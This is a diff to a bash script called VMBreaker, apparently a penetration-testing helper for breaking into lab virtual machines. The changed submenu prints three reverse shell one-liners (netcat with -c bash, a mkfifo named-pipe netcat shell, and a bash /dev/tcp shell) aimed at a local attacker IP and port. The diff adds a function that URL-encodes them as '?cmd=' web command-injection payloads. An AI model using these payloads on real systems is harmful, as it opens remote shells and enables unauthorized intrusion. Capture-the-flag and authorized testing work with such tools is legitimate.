@@ -32,7 +32,7 @@
 
 NAMEPROGRAM="VMBreaker (by Kerszi/MindCrafters)"
 DATE="2024-04-15"
-VERSION="0.39a2"
+VERSION="0.39a3"
 DESCRIPTION="This is a program for basic operations to break into a virtual machine."
 # Main variables - if you need before export like: export VARIABLE
 # IP=""
@@ -196,9 +196,9 @@ show_verbose_variables() {
         echo -e "\033[0;32mLPORT:\033[0m       $LPORT"
     fi    
     if [[ -z "$EXPLOIT" ]]; then
-        echo -e "\033[0;32mEXPLOIT:\033[0m       Name of exploit."
+        echo -e "\033[0;32mEXPLOIT:\033[0m     Name of exploit."
     else
-        echo -e "\033[0;32mEXPLOIT:\033[0m       $EXPLOIT"
+        echo -e "\033[0;32mEXPLOIT:\033[0m     $EXPLOIT"
     fi    
 
 }
@@ -624,29 +624,35 @@ submenu9() {
         "3")
             clear                    
             FIRSTEXAMPLE="nc -c bash $LOCALIP $LPORT"
-            FIRSTEXAMPLEENCODED=$(urlencode "$FIRSTEXAMPLE")
+            FIRSTEXAMPLEENCODEDPLUS=$(urlencode_plus "$FIRSTEXAMPLE")            
+            FIRSTEXAMPLEENCODED=$(urlencode "$FIRSTEXAMPLE")            
             echo "1. Netcat (Traditional) Reverse Shell:"
             echo -e "\e[90mUses netcat with the -c option to execute bash on the connected system.\e[0m"
-            echo -e "\e[32m$FIRSTEXAMPLE\e[0m"            
-            echo -e "\e[32m$FIRSTEXAMPLEENCODED\e[0m"            
+            echo -e "\e[32m$FIRSTEXAMPLE\e[0m"
+            echo -e "\e[96m?cmd=\e[32m$FIRSTEXAMPLEENCODEDPLUS\e[0m"
+            echo -e "\e[96m?cmd=\e[32m$FIRSTEXAMPLEENCODED\e[0m"            
             echo ""
 
             echo "2. Netcat (OpenBSD) with Named Pipe:"
             SECONDEXAMPLE="rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc $LOCALIP $LPORT >/tmp/f"
-            SECONDEXAMPLEENCODED=$(urlencode "$SECONDEXAMPLE")
+            SECONDEXAMPLEENCODEDPLUS=$(urlencode_plus "$SECONDEXAMPLE")
+            SECONDEXAMPLEENCODED=$(urlencode "$SECONDEXAMPLE")            
             echo -e "\e[90mCreates a FIFO pipe and uses it to execute a shell, redirecting input and output through netcat.\e[0m"
             echo -e "\e[32m$SECONDEXAMPLE\e[0m"
-            echo -e "\e[32m$SECONDEXAMPLEENCODED\e[0m"
+            echo -e "\e[96m?cmd=\e[32m$SECONDEXAMPLEENCODEDPLUS\e[0m"
+            echo -e "\e[96m?cmd=\e[32m$SECONDEXAMPLEENCODED\e[0m"            
             echo ""
 
             echo "3. Bash TCP Reverse Shell:"
             THIRDEXAMPLE="bash -i >& /dev/tcp/$LOCALIP/$LPORT 0>&1"
-            THIRDEXAMPLEENCODED=$(urlencode "$THIRDEXAMPLE")
+            THIRDEXAMPLEENCODEDPLUS=$(urlencode_plus "$THIRDEXAMPLE")
+            THIRDEXAMPLEENCODED=$(urlencode "$THIRDEXAMPLE")            
             echo -e "\e[90mUtilizes bash to create a reverse shell that connects back to a specified IP and port over TCP.\e[0m"
             echo -e "\e[32m$THIRDEXAMPLE\e[0m"
-            echo -e "\e[32m$THIRDEXAMPLEENCODED\e[0m"
+            echo -e "\e[96m?cmd=\e[32m$THIRDEXAMPLEENCODEDPLUS\e[0m"
+            echo -e "\e[96m?cmd=\e[32m$THIRDEXAMPLEENCODED\e[0m"            
             echo ""
-            echo -e "\e[90mNote: Always ensure you have authorization before connecting to any system.\e[0m"
+            echo -e "\e[31mNote: Always ensure you have authorization before connecting to any system.\e[0m"
             exit 0
             ;;
         *)
@@ -730,6 +736,20 @@ urlencode() {
         esac
     done
 }
+
+urlencode_plus() {
+    local length="${#1}"
+    for (( i = 0; i < length; i++ )); do
+        local c="${1:i:1}"
+        case $c in
+            [a-zA-Z0-9.~_-]) printf "$c" ;;
+            " ") printf "+" ;;
+            *) printf '%%%02X' "'$c" ;;
+        esac
+    done
+}
+
+
 
 run_program_green() {
     COMMAND=$1
